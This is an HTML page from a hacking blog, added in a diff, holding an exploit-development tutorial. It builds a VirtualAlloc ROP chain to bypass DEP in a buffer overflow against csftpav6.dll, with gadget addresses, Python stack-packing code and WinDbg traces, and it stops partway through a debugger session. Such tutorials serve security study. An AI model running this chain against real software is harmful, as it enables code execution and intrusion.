@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+        <script>
+            if (location.host != new URL("http:\/\/localhost:1313\/").host) location.href = "http:\/\/localhost:1313\/"
+        </script>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='http://localhost:1313/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='http://localhost:1313/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='http://localhost:1313/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='http://localhost:1313/favicon.png'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+        purpurina - a place for hacking
+    </title>
+
+    
+    <link href="http://localhost:1313/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
+    <link href="http://localhost:1313/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>
+
+    
+    
+    <link type="text/css" rel="stylesheet" href=http://localhost:1313/css/styles.b88203936c598b692d9cbebd7da89eb34e544b8522ae4c14ca657761be96b80c2acee8e6631de04d99ee1bdbc1bcad4a3add6f47a2366f4a29e2c531782be1a8.css integrity="sha512-uIIDk2xZi2ktnL69faies05US4UirkwUymV3Yb6WuAwqzujmYx3gTZnuG9vBvK1KOt1vR6I2b0op4sUxeCvhqA==" />
+<meta name="author" content="jaco" />
+
+    
+    
+        <meta name="description" content="-rop&#34;&gt;VirtualAlloc ROP&lt;/h1&gt;
+&lt;p&gt;Let&amp;rsquo;s see how we can use VirtualAlloc to bypass DEP.
+VirtualAlloc is a Windows API function that can reserve, commit, &lt;strong&gt;or change&lt;/strong&gt; the state of a region of pages in the virtual address space of the calling process.
+We are going to invoke VirtualAlloc by placing a skeleton of the function call on the stack through the buffer overflow, modifying its address and parameters through ROP, and then return into it. The skeleton should contain the VirtualAlloc address followed by the return address (which should be our shellcode) and the arguments for the function call.
+Let&amp;rsquo;s see the skeleton of VirtualAlloc:&lt;/p&gt;" />
+    
+
+<meta property="og:site_name"
+    content='purpurina - a place for hacking' />
+
+    <meta property="og:title" content="" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="jaco" />
+    <meta
+        property="article:published_time"
+        content='0001-01-01T00:00:00Z&#43;0000' />
+    
+    <meta property="og:url" content="http://localhost:1313/posts/osed_rop_2/" />
+    
+    
+    <meta property="og:image"
+        content="http://localhost:1313/icon512.png" />
+    
+        <meta property="og:description" content="&lt;h1 id=&#34;virtualalloc-rop&#34;&gt;VirtualAlloc ROP&lt;/h1&gt;
+&lt;p&gt;Let&amp;rsquo;s see how we can use VirtualAlloc to bypass DEP.
+VirtualAlloc is a Windows API function that can re" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='localhost:1313'
+/>
+<meta property="twitter:url" content="http://localhost:1313/posts/osed_rop_2/" />
+
+
+    <meta name="twitter:title" content="" />
+    
+    
+    
+    <meta name="twitter:image"
+        content="http://localhost:1313/icon512.png" />
+    
+        <meta name="twitter:description" content="&lt;h1 id=&#34;virtualalloc-rop&#34;&gt;VirtualAlloc ROP&lt;/h1&gt;
+&lt;p&gt;Let&amp;rsquo;s see how we can use VirtualAlloc to bypass DEP.
+VirtualAlloc is a Windows API function that can re" />
+    
+
+<link rel="manifest" href="http://localhost:1313/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="http://localhost:1313/">
+                    <img src='http://localhost:1313/logo.jpg' alt='Logo'/>
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="http://localhost:1313/">purpurina - a place for hacking</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="http://localhost:1313/">Home</a></li>
+        
+            <li><a href="http://localhost:1313/posts/">Posts</a></li>
+        
+        
+        
+        
+        
+        
+            <li><a href="http://localhost:1313/about/">About</a></li>
+        
+        
+            <li><a href="http://localhost:1313/tags/">Tags</a></li>
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search/?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/jacobocasado/?originalSubdomain=es">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        LinkedIn
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1></h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    0001-01-01
+
+</p>
+    
+    
+    
+    
+    <div><h1 id="virtualalloc-rop">VirtualAlloc ROP</h1>
+<p>Let&rsquo;s see how we can use VirtualAlloc to bypass DEP.
+VirtualAlloc is a Windows API function that can reserve, commit, <strong>or change</strong> the state of a region of pages in the virtual address space of the calling process.
+We are going to invoke VirtualAlloc by placing a skeleton of the function call on the stack through the buffer overflow, modifying its address and parameters through ROP, and then return into it. The skeleton should contain the VirtualAlloc address followed by the return address (which should be our shellcode) and the arguments for the function call.
+Let&rsquo;s see the skeleton of VirtualAlloc:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">VirtualAlloc</span>(
+</span></span><span style="display:flex;"><span>[in, optional] LPVOID lpAddress,
+</span></span><span style="display:flex;"><span>[in] SIZE_T dwSize,
+</span></span><span style="display:flex;"><span>[in] DWORD flAllocationType,
+</span></span><span style="display:flex;"><span>[in] DWORD flProtect );
+</span></span></code></pre></div><p>As shown in the function prototype, VirtualAlloc requires a parameter (dwSize) for the size of the memory region whose protection properties we are trying to change.
+However, VirtualAlloc can only change the memory protections <strong>on a per-page basis</strong>, so as long as our shellcode is less than <strong>0x1000 bytes</strong> (which will probably always less than such size), we can use any value between 0x01 and 0x1000.
+The two final arguments are predefined enums.
+flAllocationType must be set to the MEM_COMMIT enum value (numerical value 0x00001000), while flProtect should be set to the PAGE_EXECUTE_READWRITE enum value (numerical value 0x00000040).343
+This will allow the memory page to be readable, writable, and executable.</p>
+<p><strong>Note</strong>: Remember that in x86 arguments are passed through the stack, so we need to push them into the stack. and not store them into the register.
+<strong>Note</strong>: We will use VirtualAlloc but we could use an analogue function called VirtualProtect for the same purpose, which is changing the memory protections of the <strong>shellcode that is already located in the stack.</strong></p>
+<p>So we will need to push in the stack the following things:</p>
+<ul>
+<li>flProtect</li>
+<li>flAllocationType</li>
+<li>dwSize</li>
+<li>lpAddress</li>
+<li>Return Address (the address of our shellcode in stack)</li>
+<li>Kernel32!VirtualAlloc address</li>
+</ul>
+<p>Note that we first insert the latest parameters in the stack, respecting the order in which the original function will access the parameters (the first parameter is the closest to EBP).
+Also, as the VirtualAlloc function will perform a &ldquo;ret&rdquo; instruction, we want to return to our shellcode so it gets executed after. That is why we add the &ldquo;Return Addres&rdquo; (like a <code>call</code> instruction would do, but as we aren&rsquo;t doing a <code>call</code> to VirtualAlloc and just a direct jump, we have to insert the return address manually). This way, once VirtualAlloc ends, the <code>ret</code> instruction will take that return address (where our shellcode starts) and execute it, once the eXecute flag has been set.</p>
+<p>Now, let&rsquo;s see the issues that we will have to handle:</p>
+<ol>
+<li>We do not know the VirtualAlloc address beforehand. This is in the kernel32 library, which has ASLR enabled.</li>
+<li>We <strong>do not know the return address</strong> (where our shellcode is) and the <strong>lpAddress</strong> (where our shellcode is) argument beforehand.</li>
+<li>dwSize, flAllocationType, and flProtect contain NULL bytes.</li>
+</ol>
+<p>We can deal with these problems by sending placeholder values in the skeleton. Then we will assemble ROP gadgets that will dynamically fix the values we have inserted in the stack, replacing them with the correct ones.</p>
+<p>Let&rsquo;s update the exploit to attach these values before the return address (therefore the exploit would be: these pushed values, the EIP overwrite, and the ROP chain to modify these values).
+The following image depicts what we are doing:
+<img src="content/images/post_images/rop_1%201.png" alt=""></p>
+<p>We will insert the following values:</p>
+<pre tabindex="0"><code>va = pack(&#34;&lt;L&#34;, (0x45454545)) # dummy VirutalAlloc Address  
+va += pack(&#34;&lt;L&#34;, (0x46464646)) # Shellcode Return Address  
+va += pack(&#34;&lt;L&#34;, (0x47474747)) # # dummy Shellcode Address  
+va += pack(&#34;&lt;L&#34;, (0x48484848)) # dummy dwSize  
+va += pack(&#34;&lt;L&#34;, (0x49494949)) # # dummy flAllocationType  
+va += pack(&#34;&lt;L&#34;, (0x51515151)) # dummy flProtect
+</code></pre><p>Now, when we print ESP, we can see that the values are not inserted properly in the stack, as the value of our shellcode address and flAllocationType are 00000000:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> dd esp <span style="color:#f92672">-</span> <span style="color:#ae81ff">24</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">014</span>ae2e8  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">45454545</span> <span style="color:#ae81ff">46464646</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">014</span>ae2f8  <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">48484848</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">51515151</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">014</span>ae308  <span style="color:#ae81ff">42424242</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
+</span></span></code></pre></div><p>However, this won’t impact us since we’re going to overwrite them again with ROP, but it&rsquo;s something we need to notice. Always inspect if the values you inserted in the stack are being properly reflected when the code is executed.</p>
+<h1 id="patching-virtualalloc-dummy-address-using-rop">Patching VirtualAlloc dummy address using ROP</h1>
+<p>First we need the stack address of the <strong>first dummy value in the stack</strong>, which is the VirtualAlloc dummy address using ROP gadgets. This value is needed so we can patch it afterwards.
+The easiest way to obtain a stack address close to the dummy values is to use the ESP value at the time of the access violation (which, if we see the image, it points to the ROP chain):
+<img src="content/images/post_images/rop_1%201.png" alt=""></p>
+<p>We cannot modify the ESP register, since it must always point to the next gadget for ROP to function. Instead, we will copy its value to another register.
+A gadget like “MOV EAX, ESP ; RET” would be ideal, but they typically do not exist as natural opcodes.
+We will need to search for another gadget, like the following one:</p>
+<pre tabindex="0"><code>0x50501110: push esp ; pop REG ; ret
+</code></pre><p>This way we push the value of esp to the top of the stack and then we save it via <code>pop</code> to any register.
+Our program does not have that type of gadget, but it does have the following gadget:</p>
+<pre tabindex="0"><code>0x50501110: push esp ; push eax ; pop edi ; pop esi ; ret
+</code></pre><p>That will push the ESP value to the stack, with the value of the register EAX (we don&rsquo;t care). That way, we pop the value of EAX into EDI and the value of ESP into ESI. This way, the ESI register will contain the ESP address, as desired.</p>
+<p>Let&rsquo;s search for alternative gadgets that can help us:</p>
+<pre tabindex="0"><code>0x505010a7: push esp ; push eax ; pop edi ; pop esi ; retn 0x0004 ;  (1 found)
+</code></pre><p>In this case, the ESP pointer gets modified by the <code>retn 0x0004</code> so it&rsquo;s not very useful&hellip;</p>
+<pre tabindex="0"><code>0x505375cf: push esp ; push eax ; pop edi ; mov eax, esi ; pop esi ; ret  ;  (1 found)
+</code></pre><p>This is very good because it adds an additional <code>mov eax, esi</code> but the <code>pop esi</code> instruction overried the value in <code>esi</code> with the value of <code>esp</code>.</p>
+<p><strong>Note:</strong> The &ldquo;pure&rdquo; rop gadgets like <code>pop esp, ret</code> are not very common as normal programs would not normally do that. So most of the time we will need combined gadgets.</p>
+<h2 id="1-obtaining-the-location-of-the-virtualalloc-parameter-in-stack">1. Obtaining the location of the VirtualAlloc parameter in stack</h2>
+<p>The <code>csftpav6.dll</code> module uses <code>VirtualAlloc</code>, which is the function we want to execute. We need the address of this function. However, the address of the <code>VirtualAlloc</code> symbol <strong>is not predictable</strong>. This is because this symbol is inside <code>ntdll.dll</code>, which has ASLR enabled. When this module is mapped in the memory, the address is randomized and therefore the address of this symbol will be randomized.</p>
+<p>However, remember that each of the imported functions that a module need are inside the <code>IAT</code> of the module. The entry of <code>VirtualAlloc</code> in the <code>csftpav6.dll</code> <strong>has a FIXED offset</strong>. When this function is mapped in memory, the entry of the IAT will be fulfilled dinamically with the address of <code>VirtualAlloc</code>. Therefore, our approach will be to search inside the IAT for the address of VirtualAlloc.
+<img src="content/images/post_images/rop_2.png" alt="">
+This is the address of VirtualAlloc inside the IAT. This means that we can use the IAT entry along with a memory dereference to fetch the address of VirtualAlloc at runtime. We’ll do this as part of our ROP chain.
+With a way to resolve the address of VirtualAlloc, we must understand how to use it. In the previous step, we placed a dummy value (0x45454545) on the stack for this API address as part of our buffer overflow, which we need to overwrite.
+To do this overwrite, we will need to perform <strong>three tasks with our ROP gadgets.</strong>
+First, locate the address on the stack where the dummy DWORD is. Second, we need to resolve the address of VirtualAlloc. Finally, we need to write that value on top of the placeholder value.</p>
+<p>We are going to need multiple gadgets for each of these tasks.
+First we have to see the offset of our dummy value from the ESP. By inspecting ESP at the moment of the ROP chain, we can see that our temporal VirtualAlloc value is at offset -1C from ESP:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">006</span><span style="color:#f92672">&gt;</span> dd esp <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>C 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>d39e300 <span style="color:#ae81ff">45454545</span> <span style="color:#ae81ff">46464646</span> <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">48484848</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>d39e310 <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">51515151</span> <span style="color:#ae81ff">42424242</span> <span style="color:#ae81ff">43434343</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>d39e320 <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
+</span></span></code></pre></div><p>The dummy value 0x45454545, which represents the location of the VirtualAlloc address, is at a negative offset of 0x1C from ESP. Ideally, since we have a copy of the ESP value in ESI, we would like to locate a gadget similar to the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>sub esi, <span style="color:#ae81ff">0x1c</span>
+</span></span><span style="display:flex;"><span>ret
+</span></span></code></pre></div><p>This way we would have a pointer to the location of the VirtualAlloc address in the stack.
+Sadly, we couldn’t find this gadget or a similar one in CSFTPAV6.
+We’ll need to be a bit more creative.
+We could put the 0x1C value on the stack as part of our overflowing buffer and then pop that value into another register of our choice using a gadget. This would allow us to subtract the two registers (esi and the register that stores 0x1c) and get the desired address.</p>
+<p><strong>Note:</strong> As we are going to perform arithmetic opertion with registers, we should dump the value in <code>esi</code> to <code>eax</code> or <code>ecx</code> as these registers commonly use these operations. The number of gadgets that we will find will be much higher.
+The idea is to have a gadget put a copy of ESI into EAX, then pop the negative value into ECX from the stack. Next, we add ECX to EAX, and finally, copy EAX back into ESI.
+One gadget that would be valid is:</p>
+<pre tabindex="0"><code>0x5050118e: mov eax, esi ; pop esi ; ret  ;  (1 found)
+</code></pre><p>The thing is that this gadgets perform an additional <code>pop esi</code> instruction, which means that we will need to add an additional DWORD in the stack for this instruction.
+We will do it like this:</p>
+<pre tabindex="0"><code>rop = pack(&#34;&lt;L&#34;, (0x5050118e)) # mov eaax, esi; pop esi; retn
+rop += pack(&#34;&lt;L&#34;, (0x42424242)) # junk for the pop esi value
+</code></pre><p><strong>Note:</strong> Usually, when debugging gadgets in our program, put a breakpoint at the gadget address you want to debug, or at the address of the first gadget in the chain. This way you skip the previous analysis, and go direcly to the gadget.  We let the execution go to the end of the first gadget with the pt command and finish its execution with the p command.</p>
+<p>If we debug this gadget, we will find that <code>eax</code> will contain the value in <code>esi</code> (nice) and that <code>esi</code> has the dummy value (we don&rsquo;t care about <code>esi</code> anymore as our value is now in <code>eax</code>, which is better for arithmetic gadgets).
+Let&rsquo;s see this gadget on debugging:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> p
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">05</span>aec298 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">85</span>ca60 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">0185e30</span>c edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">5050118</span>e esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0185e310</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
+</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">+</span><span style="color:#ae81ff">0x118e</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5050118</span>e <span style="color:#ae81ff">8</span>bc6            mov     eax,esi
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> p
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">0185e30</span>c ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">05</span>aec298 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">85</span>ca60 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">0185e30</span>c edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">50501190</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0185e310</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
+</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1190</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50501190</span> <span style="color:#ae81ff">5</span>e              pop     esi
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> p
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">0185e30</span>c ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">05</span>aec298 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">85</span>ca60 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">50501191</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0185e314</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
+</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1191</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">50501191</span> c3              ret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">077</span><span style="color:#f92672">&gt;</span> dd eax
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0185e30</span>c  <span style="color:#ae81ff">5050118</span>e <span style="color:#ae81ff">42424242</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0185e31</span>c  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0185e32</span>c  <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span> <span style="color:#ae81ff">43434343</span>
+</span></span></code></pre></div><p>As seen, <code>esi</code> contains our dummy value on top of the stack and then <code>eax</code> has the original <code>esi</code> value (pointer to our original ESP location, the location of the first ROP gadget).
+Next, we have to pop the -0x1C value into ECX and add it to EAX. We can use a “POP ECX” instruction to get the negative value into ECX, followed by a gadget containing an “ADD EAX, ECX” instruction. This will allow us to add -0x1C to EAX
+Let&rsquo;s search for this gadgets, will probably be pure as they are common operations:</p>
+<pre tabindex="0"><code>0x505115a3: pop ecx ; ret  ;  (1 found)
+0x5051579a: add eax, ecx ; ret  ;  (1 found)
+</code></pre><p>Now we have to insert these two gadgets and the 0x1c value after the first gadget:</p>
+<pre tabindex="0"><code>rop += pack(&#34;&lt;L&#34;, (0x505115a3)) # pop ecx ; ret  
+rop += pack(&#34;&lt;L&#34;, (0xffffffe4)) # -0x1C  
+rop += pack(&#34;&lt;L&#34;, (0x5051579a)) # add eax, ecx ; ret
+</code></pre><p>Note how the -0x1c is calculated, it is done like this:</p>
+<ul>
+<li><strong>(28)</strong> in binary (32 bits):<br>
+<code>00000000 00000000 00000000 00011100</code></li>
+<li><strong>Inverting the bits</strong>:<br>
+<code>11111111 11111111 11111111 11100011</code></li>
+<li><strong>Add 1</strong> (complemento a dos):<br>
+<code>11111111 11111111 11111111 11100100</code></li>
+</ul>
+<p>Now, inserting these gadget at the end shows us that the EAX points to our VirtualAlloc address in the stack, meaning that we already have a pointer to this value in EAX:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> p
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">0245e30</span>c ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">06651</span>db0 ecx<span style="color:#f92672">=</span>ffffffe4 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">5051579</span>a esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0245e320</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
+</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x48fc</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5051579</span>a <span style="color:#ae81ff">03</span>c1            add     eax,ecx
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> p
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">0245e2</span>f0 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">06651</span>db0 ecx<span style="color:#f92672">=</span>ffffffe4 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77042</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">5051579</span>c esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0245e320</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz ac pe cy
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000217</span>
+</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x48fe</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5051579</span>c c3              ret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dd eax L1
